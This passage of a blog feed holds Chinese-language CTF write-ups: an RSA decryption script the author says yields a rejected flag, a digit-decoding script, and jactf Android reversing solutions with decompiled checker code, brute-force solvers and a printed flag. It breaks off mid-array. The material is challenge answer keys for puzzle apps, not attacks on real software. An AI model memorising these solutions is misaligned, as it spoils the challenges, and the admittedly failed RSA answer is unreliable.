class="number">966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span></span><br><span class="line">c = <span class="number">168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848</span></span><br><span class="line">p = <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</span></span><br><span class="line">q = <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">g, x, y = egcd(a, m)</span><br><span class="line"><span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> x % m</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'d='</span>,d</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:len(hex(m))<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag提交不对，不知道为什么</p></blockquote><h3 id="幂数"><a href="#幂数" class="headerlink" title="幂数"></a>幂数</h3><p><img src="/images/pasted-28.png" alt="upload successful"></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">a=a.split(<span class="string">"0"</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</span><br><span class="line">     str = a[i]</span><br><span class="line">     list=[]</span><br><span class="line">     sum=<span class="number">0</span></span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        list.append(j)</span><br><span class="line">        length = len(list)</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">        sum+=int(list[k])</span><br><span class="line">     flag += chr(sum+<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jactf-android</title>
      <link href="/jactf-android.html"/>
      <url>/jactf-android.html</url>
      
        <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="androideasy"><a href="#androideasy" class="headerlink" title="androideasy"></a>androideasy</h3><p><img src="/images/pasted-5.png" alt="upload successful"></p><h4 id="jadx打开，查看主页面"><a href="#jadx打开，查看主页面" class="headerlink" title="jadx打开，查看主页面"></a>jadx打开，查看主页面</h4><p><img src="/images/pasted-4.png" alt="upload successful"></p><blockquote><p>可以直接看到程序通过得到editText的内容和23异或和代码定义的s进行对比</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-6.png" alt="upload successful"></p><h3 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h3><p><img src="/images/pasted-7.png" alt="upload successful"></p><h4 id="jadx打开，查看主页面-1"><a href="#jadx打开，查看主页面-1" class="headerlink" title="jadx打开，查看主页面"></a>jadx打开，查看主页面</h4><p><img src="/images/pasted-8.png" alt="upload successful"></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><blockquote><p>通过输入和VERSION_NAME ^ VERSION_CODE相比</p></blockquote><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-10.png" alt="upload successful"></p><h3 id="simplecheck"><a href="#simplecheck" class="headerlink" title="simplecheck"></a>simplecheck</h3><p><img src="/images/pasted-11.png" alt="upload successful"></p><h4 id="JEB"><a href="#JEB" class="headerlink" title="JEB"></a>JEB</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.simplecheck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.c;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F04001B</span>);</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F0B005F</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener(<span class="keyword">this</span>.findViewById(<span class="number">0x7F0B005E</span>), ((Context)<span class="keyword">this</span>)) &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg4)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(a.a(<span class="keyword">this</span>.a.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>.b, <span class="string">"You get it~"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>.b, <span class="string">"Sorry its wrong"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主页得到输入内容调用a类的a方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.simplecheck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] b;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] c;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        a.a = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0</span>, <span class="number">0x8BBD6FE</span>, <span class="number">205327308</span>, <span class="number">0x59E0C2D</span>, <span class="number">138810487</span>, <span class="number">408218567</span>, <span class="number">0x4A42485</span>, <span class="number">0x443BE85</span>, <span class="number">0x21929A0A</span>, <span class="number">559010506</span>, <span class="number">449018203</span>, <span class="number">576200653</span>, <span class="number">307283021</span>, <span class="number">0x1BDF218B</span>, <span class="number">314806739</span>, <span class="number">0x1459AAFB</span>, <span class="number">0x1459AAFB</span>, <span class="number">0x1C039BBC</span>, <span class="number">0x18E61B76</span>, <span class="number">342206934</span>, <span class="number">392460324</span>, <span class="number">382290309</span>, <span class="number">0xB0F0211</span>, <span class="number">364788505</span>, <span class="number">210058699</span>, <span class="number">0xBCF56CF</span>, <span class="number">0x1580960D</span>, <span class="number">440064477</span>, <span class="number">0x1310B245</span>, <span class="number">0x284EE4B3</span>, <span class="number">0x1732EFAB</span>, <span class="number">0x3175430D</span>, <span class="number">0x1FE113C4</span>, <span class="number">0x197B593C</span>, <span class="number">0x33806C28</span>&#125;;</span><br><span class="line">        a.b = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">13710</span>, <span class="number">0xB539</span>, <span class="number">0xBFFF</span>, <span class="number">36900</span>, <span class="number">0xE8AC</span>, <span class="number">0x8C2B</span>, <span class="number">0xDBD</span>, <span class="number">0xCEDD</span>, <span class="number">1509</span>, <span class="number">0xEF17</span>, <span class="number">0xF72A</span>, <span class="number">0x6C2E</span>, <span class="number">20932</span>, <span class="number">0x946D</span>, <span class="number">22069</span>, <span class="number">0x20F6</span>, <span class="number">0x84CB</span>, <span class="number">0xD032</span>, <span class="number">0x420C</span>, <span class="number">30902</span>, <span class="number">0xFC5A</span>, <span class="number">0xFA1C</span>, <span class="number">0x73BD</span>, <span class="number">0x67A9</span>, <span class="number">0x2EFA</span>, <span class="number">31610</span>, <span class="number">0xBDFF</span>, <span class="number">0x4E00</span>, <span class="number">0xB256</span>, <span class="number">0xCB04</span>, <span class="number">0xFDBC</span>, <span class="number">0xB0ED</span>, <span class="number">0xFCF0</span>, <span class="number">0x90F4</span>&#125;;</span><br><span class="line">        a.c = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0x94F1</span>, <span class="number">0xE00B</span>, <span class="number">0x580A</span>, <span class="number">0xBA97</span>, <span class="number">8940</span>, <span class="number">0x136F</span>, <span class="number">27050</span>, <span class="number">56102</span>, <span class="number">0x5524</span>, <span class="number">0xA0D6</span>, <span class="number">0xF7D5</span>, <span class="number">0xD0CE</span>, <span class="number">0x705A</span>, <span class="number">0xE74F</span>, <span class="number">0x4017</span>, <span class="number">0xFB54</span>, <span class="number">0x930C</span>, <span class="number">0xE9F8</span>, <span class="number">0xA13C</span>, <span class="number">0x6528</span>, <span class="number">27501</span>, <span class="number">0x9820</span>, <span class="number">0x90AF</span>, <span class="number">0x9545</span>, <span class="number">0xF192</span>, <span class="number">0xA9E9</span>, <span class="number">0x2405</span>, <span class="number">9879</span>, <span class="number">0x3864</span>, <span class="number">60468</span>, <span class="number">0x4DD6</span>, <span class="number">0xB85E</span>, <span class="number">8406</span>, <span class="number">0xFC9A</span>&#125;;</span><br><span class="line">        a.d = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0</span>, <span class="number">0xEB9D9218</span>, -<span class="number">370404060</span>, <span class="number">0xF0A59DD2</span>, -<span class="number">494024809</span>, <span class="number">0xF7EFFC3F</span>, <span class="number">54930974</span>, <span class="number">0xF6B60C82</span>, <span class="number">0x203630EA</span>, <span class="number">0xF99AF01A</span>, <span class="number">0xF85E01A6</span>, <span class="number">0xFCF9241</span>, <span class="number">0x1072E161</span>, <span class="number">119059597</span>, <span class="number">202392013</span>, <span class="number">0x10E88ED9</span>, <span class="number">0x786F15C</span>, -<span class="number">68971076</span>, <span class="number">0xF91DD26</span>, <span class="number">0xBC673D6</span>, <span class="number">0xFF3B4367</span>, -<span class="number">10293675</span>, <span class="number">0x598502B</span>, <span class="number">0x7406995</span>, <span class="number">0x9FB416F</span>, <span class="number">0x758311F</span>, <span class="number">221507</span>, <span class="number">0xF6EB9D4</span>, <span class="number">180963987</span>, <span class="number">107841171</span>, <span class="number">41609001</span>, <span class="number">0x107B88B5</span>, <span class="number">0xA21BFA2</span>, <span class="number">0x1075D862</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String arg8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> v1 = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg8.length() == a.b.length) &#123;</span><br><span class="line">            <span class="keyword">int</span>[] v4 = <span class="keyword">new</span> <span class="keyword">int</span>[a.a.length];</span><br><span class="line">            v4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] v5 = arg8.getBytes();</span><br><span class="line">            <span class="keyword">int</span> v6 = v5.length;</span><br><span class="line">            <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> v3 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(v0 &lt; v6) &#123;</span><br><span class="line">                v4[v3] = v5[v0];</span><br><span class="line">                ++v3;</span><br><span class="line">                ++v0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(v0 &gt;= a.c.length) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(a.a[v0] == a.b[v0] * v4[v0] * v4[v0] + a.c[v0] * v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + <span class="number">1</span>] == a.b[v0] * v4[v0 + <span class="number">1</span>] * v4[v0 + <span class="number">1</span>] + a.c[v0] * v4[v0 + <span class="number">1</span>] + a.d[v0]) &#123;</span><br><span class="line">                    ++v0;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> v1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v1 = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>a.b[v0] <em> v4[v0] </em> v4[v0] + a.c[v0] <em> v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] </em> v4[v0 + 1] <em> v4[v0 + 1] + a.c[v0] </em> v4[v0 + 1] + a.d[v0] 可以将这句话改进一下进行爆破</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0</span>, <span class="number">146527998</span>, <span class="number">205327308</span>, <span class="number">94243885</span>, <span class="number">138810487</span>, <span class="number">408218567</span>, <span class="number">77866117</span>, <span class="number">71548549</span>, <span class="number">563255818</span>, <span class="number">559010506</span>, <span class="number">449018203</span>, <span class="number">576200653</span>, <span class="number">307283021</span>, <span class="number">467607947</span>, <span class="number">314806739</span>, <span class="number">341420795</span>, <span class="number">341420795</span>, <span class="number">469998524</span>, <span class="number">417733494</span>, <span class="number">342206934</span>, <span class="number">392460324</span>, <span class="number">382290309</span>, <span class="number">185532945</span>, <span class="number">364788505</span>, <span class="number">210058699</span>, <span class="number">198137551</span>, <span class="number">360748557</span>, <span class="number">440064477</span>, <span class="number">319861317</span>, <span class="number">676258995</span>, <span class="number">389214123</span>, <span class="number">829768461</span>, <span class="number">534844356</span>, <span class="number">427514172</span>, <span class="number">864054312</span>]</span><br><span class="line">b = [<span class="number">13710</span>, <span class="number">46393</span>, <span class="number">49151</span>, <span class="number">36900</span>, <span class="number">59564</span>, <span class="number">35883</span>, <span class="number">3517</span>, <span class="number">52957</span>, <span class="number">1509</span>, <span class="number">61207</span>, <span class="number">63274</span>, <span class="number">27694</span>, <span class="number">20932</span>, <span class="number">37997</span>, <span class="number">22069</span>, <span class="number">8438</span>, <span class="number">33995</span>, <span class="number">53298</span>, <span class="number">16908</span>, <span class="number">30902</span>, <span class="number">64602</span>, <span class="number">64028</span>, <span class="number">29629</span>, <span class="number">26537</span>, <span class="number">12026</span>, <span class="number">31610</span>, <span class="number">48639</span>, <span class="number">19968</span>, <span class="number">45654</span>, <span class="number">51972</span>, <span class="number">64956</span>, <span class="number">45293</span>, <span class="number">64752</span>, <span class="number">37108</span>]</span><br><span class="line">c = [<span class="number">38129</span>, <span class="number">57355</span>, <span class="number">22538</span>, <span class="number">47767</span>, <span class="number">8940</span>, <span class="number">4975</span>, <span class="number">27050</span>, <span class="number">56102</span>, <span class="number">21796</span>, <span class="number">41174</span>, <span class="number">63445</span>, <span class="number">53454</span>, <span class="number">28762</span>, <span class="number">59215</span>, <span class="number">16407</span>, <span class="number">64340</span>, <span class="number">37644</span>, <span class="number">59896</span>, <span class="number">41276</span>, <span class="number">25896</span>, <span class="number">27501</span>, <span class="number">38944</span>, <span class="number">37039</span>, <span class="number">38213</span>, <span class="number">61842</span>, <span class="number">43497</span>, <span class="number">9221</span>, <span class="number">9879</span>, <span class="number">14436</span>, <span class="number">60468</span>, <span class="number">19926</span>, <span class="number">47198</span>, <span class="number">8406</span>, <span class="number">64666</span>]</span><br><span class="line">d = [<span class="number">0</span>, <span class="number">-341994984</span>, <span class="number">-370404060</span>, <span class="number">-257581614</span>, <span class="number">-494024809</span>, <span class="number">-135267265</span>, <span class="number">54930974</span>, <span class="number">-155841406</span>, <span class="number">540422378</span>, <span class="number">-107286502</span>, <span class="number">-128056922</span>, <span class="number">265261633</span>, <span class="number">275964257</span>, <span class="number">119059597</span>, <span class="number">202392013</span>, <span class="number">283676377</span>, <span class="number">126284124</span>, <span class="number">-68971076</span>, <span class="number">261217574</span>, <span class="number">197555158</span>, <span class="number">-12893337</span>, <span class="number">-10293675</span>, <span class="number">93868075</span>, <span class="number">121661845</span>, <span class="number">167461231</span>, <span class="number">123220255</span>, <span class="number">221507</span>, <span class="number">258914772</span>, <span class="number">180963987</span>, <span class="number">107841171</span>, <span class="number">41609001</span>, <span class="number">276531381</span>, <span class="number">169983906</span>, <span class="number">276158562</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> v0 <span class="keyword">in</span> range(<span class="number">1</span>,len(c)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> a[v0] == b[v0] * i * i + c[v0] * i + d[v0] <span class="keyword">and</span> a[v0] == b[v0<span class="number">-1</span>] * i * i + c[v0<span class="number">-1</span>] * i +d[v0<span class="number">-1</span>]:</span><br><span class="line">            s += chr(i)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"></span><br><span class="line"><span class="comment">#a[v0] == b[v0] * v4[v0] * v4[v0] + c[v0] * v4[v0] + d[v0]</span></span><br><span class="line"><span class="comment">#a[v0] == b[v0-1] * v4[v0] * v4[v0] + c[v0-1] * v4[v0] +d[v0-1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## flag&#123;MAth_i&amp;_GOOd_DON7_90V_7hInK?&#125;</span></span><br></pre></td></tr></table></figure><h3 id="DDCTF-Easy"><a href="#DDCTF-Easy" class="headerlink" title="DDCTF-Easy"></a>DDCTF-Easy</h3><p><img src="/images/pasted-12.png" alt="upload successful"></p><h4 id="jadx定位关键代码"><a href="#jadx定位关键代码" class="headerlink" title="jadx定位关键代码"></a>jadx定位关键代码</h4><p><img src="/images/pasted-13.png" alt="upload successful"></p><blockquote><p>输入的字符与i()函数返回的字符串相比较</p></blockquote><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">"com.didi_ctf.flagapp.FlagActivity"</span></span><br><span class="line">p = [<span class="number">-40</span>, <span class="number">-62</span>, <span class="number">107</span>, <span class="number">66</span>, <span class="number">-126</span>, <span class="number">103</span>, <span class="number">-56</span>, <span class="number">77</span>, <span class="number">122</span>, <span class="number">-107</span>, <span class="number">-24</span>, <span class="number">-127</span>, <span class="number">72</span>, <span class="number">-63</span>, <span class="number">-98</span>, <span class="number">64</span>, <span class="number">-24</span>, <span class="number">-5</span>, <span class="number">-49</span>, <span class="number">-26</span>, <span class="number">79</span>, <span class="number">-70</span>, <span class="number">-26</span>, <span class="number">-81</span>, <span class="number">120</span>, <span class="number">25</span>, <span class="number">111</span>, <span class="number">-100</span>, <span class="number">-23</span>, <span class="number">-9</span>, <span class="number">122</span>, <span class="number">-35</span>, <span class="number">66</span>, <span class="number">-50</span>, <span class="number">-116</span>, <span class="number">3</span>, <span class="number">-72</span>, <span class="number">102</span>, <span class="number">-45</span>, <span class="number">-85</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">-34</span>, <span class="number">62</span>, <span class="number">83</span>, <span class="number">-34</span>, <span class="number">48</span>, <span class="number">-111</span>, <span class="number">61</span>, <span class="number">-9</span>, <span class="number">-51</span>, <span class="number">114</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">-126</span>, <span class="number">-18</span>, <span class="number">27</span>, <span class="number">-115</span>, <span class="number">-76</span>, <span class="number">-116</span>, <span class="number">-48</span>, <span class="number">-118</span>, <span class="number">-10</span>, <span class="number">-102</span>, <span class="number">-106</span>, <span class="number">113</span>, <span class="number">-104</span>, <span class="number">98</span>, <span class="number">-109</span>, <span class="number">74</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">-100</span>, <span class="number">-88</span>, <span class="number">121</span>, <span class="number">22</span>, <span class="number">-63</span>, <span class="number">-32</span>, <span class="number">-20</span>, <span class="number">-41</span>, <span class="number">-27</span>, <span class="number">-20</span>, <span class="number">-118</span>, <span class="number">100</span>, <span class="number">-76</span>, <span class="number">70</span>, <span class="number">-49</span>, <span class="number">-39</span>, <span class="number">-27</span>, <span class="number">-106</span>, <span class="number">-13</span>, <span class="number">-108</span>, <span class="number">115</span>, <span class="number">-87</span>, <span class="number">-1</span>, <span class="number">-22</span>, <span class="number">-53</span>, <span class="number">21</span>, <span class="number">-100</span>, <span class="number">124</span>, <span class="number">-95</span>, <span class="number">-40</span>, <span class="number">62</span>, <span class="number">-69</span>, <span class="number">29</span>, <span class="number">56</span>, <span class="number">-53</span>, <span class="number">85</span>, <span class="number">-48</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">-78</span>, <span class="number">11</span>, <span class="number">-110</span>, <span class="number">-24</span>, <span class="number">-120</span>, <span class="number">-82</span>, <span class="number">6</span>, <span class="number">-94</span>, <span class="number">-101</span>]</span><br><span class="line">q = [<span class="number">-57</span>, <span class="number">-90</span>, <span class="number">53</span>, <span class="number">-71</span>, <span class="number">-117</span>, <span class="number">98</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">-96</span>, <span class="number">36</span>, <span class="number">110</span>, <span class="number">77</span>, <span class="number">-83</span>, <span class="number">-121</span>, <span class="number">2</span>, <span class="number">-48</span>, <span class="number">94</span>, <span class="number">-106</span>, <span class="number">-56</span>, <span class="number">-49</span>, <span class="number">-80</span>, <span class="number">-1</span>, <span class="number">83</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">-44</span>, <span class="number">74</span>, <span class="number">2</span>, <span class="number">-36</span>, <span class="number">-42</span>, <span class="number">-103</span>, <span class="number">6</span>, <span class="number">-115</span>, <span class="number">-40</span>, <span class="number">69</span>, <span class="number">-107</span>, <span class="number">85</span>, <span class="number">-78</span>, <span class="number">-49</span>, <span class="number">54</span>, <span class="number">78</span>, <span class="number">-26</span>, <span class="number">15</span>, <span class="number">98</span>, <span class="number">-70</span>, <span class="number">8</span>, <span class="number">-90</span>, <span class="number">94</span>, <span class="number">-61</span>, <span class="number">-84</span>, <span class="number">64</span>, <span class="number">112</span>, <span class="number">51</span>, <span class="number">-29</span>, <span class="number">-34</span>, <span class="number">126</span>, <span class="number">-21</span>, <span class="number">-126</span>, <span class="number">-71</span>, <span class="number">-31</span>, <span class="number">-24</span>, <span class="number">-60</span>, <span class="number">-2</span>, <span class="number">-81</span>, <span class="number">66</span>, <span class="number">-84</span>, <span class="number">85</span>, <span class="number">-91</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">-8</span>, <span class="number">-63</span>, <span class="number">26</span>, <span class="number">126</span>, <span 